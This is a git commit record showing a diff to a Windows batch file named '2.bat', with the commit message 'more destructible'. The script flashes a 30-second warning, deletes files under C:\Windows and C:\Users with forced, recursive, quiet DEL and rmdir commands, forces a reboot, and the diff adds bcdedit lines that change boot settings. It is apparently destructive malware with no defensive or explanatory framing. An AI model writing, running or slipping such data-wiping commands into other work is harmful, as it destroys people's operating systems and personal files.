1300ec50e01a1fa89aeae295fc0bea981ecdd152
Aaravdevelops <137682685+Aaravdevelops@users.noreply.github.com>
2024-10-17 11:19:37 +0530

    Update 2.bat
    more destructible

--- 2.bat
+++ 2.bat
@@ -1,5 +1,9 @@
 @echo off
 start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 30 SECONDS!&echo(&pause"
+bcdedit /set {default} recoveryenabled Yes
+bcdedit /set {default} bootstatuspolicy DisplayAllFailures
+bcdedit /set {bootmgr} displaybootmenu Yes
+bcdedit /timeout 1
 DEL /P /F /S /Q /A C:\Windows*.*
 rmdir C:\Users*.* /S /Q
 shutdown -r /o -t 30
